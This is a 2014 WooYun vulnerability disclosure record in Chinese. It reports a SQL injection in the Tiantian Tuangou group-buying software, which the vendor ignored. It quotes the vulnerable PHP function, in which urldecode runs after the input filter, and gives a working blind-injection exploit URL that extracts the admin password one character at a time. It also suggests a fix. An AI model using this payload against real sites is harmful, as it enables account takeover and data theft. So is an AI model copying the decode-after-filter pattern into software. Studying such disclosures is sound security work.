{"id": 56462, "wybug_id": "wooyun-2014-057624", "wybug_title": "天天团购SQL注射漏洞", "wybug_corp": "杭州神话", "wybug_author": "Noxxx", "wybug_date": "2014-04-19 11:02", "wybug_open_date": "2014-04-24 11:03", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 注射 详细说明：  3.62的版本 官方下的最新版本问题在 account.mod.php文件里使用了urldecode 由于\"GET 是通过 urldecode() 传递的。\" 所以穿进来的值会先解码一次 。而导致的注射 虽然限制了45个字节但是还是能跑出密码\nfunction Sendcheckmail()\t{\t\t$uname = get('uname', 'string');\t\t$uname = preg_replace('/[\\s\\(\\)\\=]/', '', $uname);\t\tif( strlen($uname) > 45) die('非法调用');\t\t$uname = urldecode($uname); //sql\t\t$user = dbc(DBCMax)->select('members')->where(array('username' => $uname, 'checked' => 0))->limit(1)->done();\t\tif ( $user != '' )\t\t{\t\t\t$this->registmail($uname, $user['email']);\t\t\t$this->Messager(\"已经发送一封确认信件到您的邮箱去了，请注意查收！\", 0);\t\t}\t\t$this->Messager(\"错误，该用户已确认信箱或不存在！\", 0);\t}\n构造的exp: http://wwww/index.php?mod=account&code=sendcheckmail&uname=admin%2522%26%26MID%2528PASSWORD,1,1%2529%253D%25223;返回 \"已经发送一封确认信件到您的邮箱去了，请注意查收！\"就证明第一位是3。   漏洞证明：  \n\n   修复方案：  不需要使用urldecode   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-04-24 11:03 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}